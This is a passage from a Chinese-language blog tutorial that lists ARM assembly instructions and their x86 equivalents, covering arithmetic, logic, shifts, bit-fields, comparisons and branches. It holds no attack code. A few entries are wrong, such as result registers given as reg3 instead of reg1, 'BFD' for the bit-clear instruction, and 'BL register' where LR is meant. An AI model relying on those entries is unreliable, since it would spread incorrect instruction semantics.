<ul>
<li><strong><code>ADD/SUB reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;</code></strong>：计算<code>&lt;reg2&gt;(+/-)&lt;reg3/imm32&gt;</code>将结果保存到<code>reg3</code></li>
<li><strong><code>ADC/SBC reg1, &lt;reg2&gt;, reg3</code></strong>：计算<code>&lt;reg2&gt;(+/-)reg3+(进位/借位)</code>将结果保存到<code>reg3</code></li>
<li><strong><code>ADC &lt;reg32&gt;, &lt;imm32&gt;</code></strong>：计算<code>reg32+imm32+进位</code>将结果保存到<code>reg32</code></li>
<li><strong><code>SBC reg1, &lt;reg2&gt;, &lt;imm32&gt;</code></strong>：计算<code>&lt;reg2&gt;-imm32-借位</code>将结果保存到<code>reg1</code></li>
<li><strong><code>RSB reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;</code></strong>：计算<code>&lt;reg3/imm&gt;-&lt;reg2&gt;</code>将结果保存到<code>reg1</code></li>
<li><strong><code>MUL reg1, &lt;reg2&gt;, reg3</code></strong>：计算<code>&lt;reg2&gt;*reg3</code>将结果保存到<code>reg1</code></li>
<li><strong><code>UDIV/SDIV reg1, &lt;reg2&gt;, reg3</code></strong>：计算<code>&lt;reg2&gt;/reg3</code>（无符号/有符号）将结果保存到<code>reg1</code>，如果除以0，则结果为0</li>
<li><strong><code>MLA reg1, &lt;reg2&gt;, reg3, &lt;reg4-32&gt;</code></strong>：计算<code>reg1=&lt;reg2&gt;*reg3+&lt;reg4-32&gt;</code></li>
<li><strong><code>MLS reg1, &lt;reg2&gt;, reg3, &lt;reg4-32&gt;</code></strong>：计算<code>reg1=-&lt;reg2&gt;*reg3+&lt;reg4-32&gt;</code></li>
</ul>
<h2 id="e-逻辑运算"><a class="markdownIt-Anchor" href="#e-逻辑运算"></a> E. 逻辑运算</h2>
<p>ARM支持x86格式的逻辑运算以及3运算符的逻辑运算。</p>
<ul>
<li><strong><code>AND/ORR/BIC/EOR reg1, &lt;reg2&gt;&#123;, &lt;reg3/imm32&gt;&#125;</code></strong>：如果<code>reg3/imm</code>存在，则表示<code>reg1=&lt;reg2&gt;(&amp;/|/&amp;~/^)&lt;reg3/imm32&gt;</code>，否则表示<code>reg1=reg1(&amp;/|/&amp;~/^)&lt;reg2&gt;</code>（与/或/与非/异或）</li>
<li><strong><code>ORN reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;</code></strong>：表示<code>reg1=&lt;reg2&gt;|~&lt;reg3/imm32&gt;</code>（或非）</li>
</ul>
<h2 id="f-移位运算"><a class="markdownIt-Anchor" href="#f-移位运算"></a> F. 移位运算</h2>
<ul>
<li><strong><code>ASR/LSL/LSR reg1, &lt;reg2&gt;&#123;, &lt;reg3/imm32&gt;&#125;</code></strong>：如果<code>reg3/imm</code>存在，则表示<code>reg1=&lt;reg2&gt;(&gt;&gt;/&lt;&lt;)&lt;reg3/imm32&gt;</code>，否则表示<code>reg1=reg1(&gt;&gt;/&lt;&lt;)&lt;reg2&gt;</code>（算数右移、逻辑左移、逻辑右移）</li>
<li><strong><code>ROR reg1, &lt;reg2&gt;&#123;, reg3&#125;</code></strong>：如果<code>reg3</code>存在，则表示<code>reg1=&lt;reg2&gt;(&gt;&gt;)reg3</code>，否则表示<code>reg1=reg1(&gt;&gt;)&lt;reg2&gt;</code>（循环右移）</li>
</ul>
<h2 id="g-符号扩展"><a class="markdownIt-Anchor" href="#g-符号扩展"></a> G. 符号扩展</h2>
<p>对应于x86中的movsx和movzx指令。</p>
<ul>
<li><strong><code>SXTB/SXTH reg1, &lt;reg2&gt;&#123;, ROR &lt;imm&gt;&#125;</code></strong>：右移<code>&lt;imm&gt;</code>位后有符号扩展<code>&lt;reg2&gt;</code>的低8/16位并赋值给<code>reg1</code></li>
<li><strong><code>UXTB/UXTH reg1, &lt;reg2&gt;&#123;, ROR &lt;imm&gt;&#125;</code></strong>：右移<code>&lt;imm&gt;</code>位后无符号扩展<code>&lt;reg2&gt;</code>的低8/16位并赋值给<code>reg1</code></li>
</ul>
<h2 id="h-数据反转"><a class="markdownIt-Anchor" href="#h-数据反转"></a> H. 数据反转</h2>
<p>将寄存器中的值按字节进行反转。</p>
<ul>
<li><strong><code>REV reg1, reg2</code></strong>：将<code>reg2</code>中的4字节数据按字节反转后赋值给<code>reg1</code>（<code>reg2</code>值不变），原先第0，1，2，3字节的内容被换到了第3，2，1，0字节。</li>
<li><strong><code>REV16 reg1, reg2</code></strong>：将<code>reg2</code>中的4字节以字单位分为高字和低字分别进行反转后赋值给<code>reg1</code>（<code>reg2</code>值不变），原先第0，1，2，3字节的内容被换到了第1，0，3，2字节。</li>
<li><strong><code>REVSH reg1, reg2</code></strong>：将<code>reg2</code>中的低2字节反转后有符号扩展赋值给<code>reg1</code></li>
<li><strong><code>REVH reg1, reg2</code></strong>：<code>REV</code>指令的16位表示，只反转低2字节。</li>
</ul>
<h2 id="i-位域操作"><a class="markdownIt-Anchor" href="#i-位域操作"></a> I. 位域操作</h2>
<p>位域操作允许机器指令对寄存器中的特定位进行处理，在x86中好像是也有这样的指令，只是使用频率太低。</p>
<ul>
<li><strong><code>BFD reg1, #lsb, #width</code></strong>：将<code>reg1</code>中从第<code>lsb</code>位开始的连续<code>width</code>位清零。</li>
<li><strong><code>BFI reg1, reg2, #lsb, #width</code></strong>：将<code>reg2</code>中最低<code>width</code>位复制到<code>reg1</code>中从<code>lsb</code>位开始的连续<code>width</code>位。</li>
<li><strong><code>CLZ reg1, reg2</code></strong>：计算<code>reg2</code>中高位0的个数并赋值给<code>reg1</code>，多用于浮点数计算。</li>
<li><strong><code>RBIT reg1, reg2</code></strong>：反转<code>reg2</code>寄存器中的所有位并赋值给<code>reg1</code>。</li>
<li><strong><code>SBFX/UBFX reg1, reg2, #lsb, #width</code></strong>：取<code>reg2</code>中从第<code>lsb</code>位开始的连续<code>width</code>位并有/无符号扩展，赋值给<code>reg1</code>。</li>
</ul>
<h2 id="j-比较和测试指令"><a class="markdownIt-Anchor" href="#j-比较和测试指令"></a> J. 比较和测试指令</h2>
<p>与x86使用<code>cmp</code>指令和<code>test</code>指令相似，ARM也有关于比较和测试的指令，且实现原理基本相同。</p>
<ul>
<li><strong><code>CMP reg1, reg2/imm</code></strong>：比较两个寄存器或寄存器与立即数，更新标志位APSR。</li>
<li><strong><code>CMN reg1, reg2/imm</code></strong>：比较<code>reg1</code>和<code>-reg2</code>或<code>-imm</code>，更新标志位APSR。</li>
<li><strong><code>TST reg1, reg2/imm</code></strong>：参照x86的<code>test</code>指令，相与测试，更新N（负数位）和Z（零）标志</li>
<li><strong><code>TEQ reg1, reg2/imm</code></strong>：异或测试，更新N和Z标志</li>
</ul>
<h2 id="k-跳转指令"><a class="markdownIt-Anchor" href="#k-跳转指令"></a> K. 跳转指令</h2>
<ul>
<li><strong><code>B/B.W &lt;label&gt;</code></strong>：无条件跳转到指定位置，<code>B.W</code>跳转范围更大。</li>
<li><strong><code>BX reg</code></strong>：寄存器跳转。</li>
<li><strong><code>BL &lt;label&gt; / BLX reg</code></strong>：跳转到指定位置/寄存器值，且将返回地址保存到<code>LR</code>寄存器中，类比x86的<code>call</code>指令。<strong>一般在函数开头都会首先将<code>BL</code>寄存器的值保存到栈中便于返回时获取。</strong></li>
<li>条件跳转指令族：类比x86指令：
<ul>
<li><code>BEQ == je</code></li>
<li><code>BNE == jne</code></li>
<li><code>BCS/BHS == jc</code>（进位标志为1，可表示无符号大于等于）</li>
<li><code>BCC/BLO == jnc</code>（进位标志为0，可表示无符号小于）</li>
<li><code>BMI == js</code>（负数标志为1）</li>
<li><code>BPL == jns</code>（负数标志为0）</li>
<li><code>BVS == jo</code>（溢出标志为1）</li>
<li><code>BVC == jno</code>（溢出标志为0）</li>
<li><code>BHI == ja</code>（无符号大于）</li>
<li><code>BLS == jbe</code>（无符号小于等于）</li>
<li><code>BGE == jge</code>（有符号大于等于）</li>
<li><code>BLE == jle</code>（有符号小于等于）</li>
<li><code>BGT == jg</code>（有符号大于）</li>
<li><code>BLT == jl</code>（有符号小于）</li>
</ul>
</li>
<li><strong><code>CBZ/CBNZ reg, &lt;label&gt;</code></strong>：比较寄存器的值为0/不为0时跳转（只支持前向跳转）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/14/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">146</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">21</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">1.3m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">19:59</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
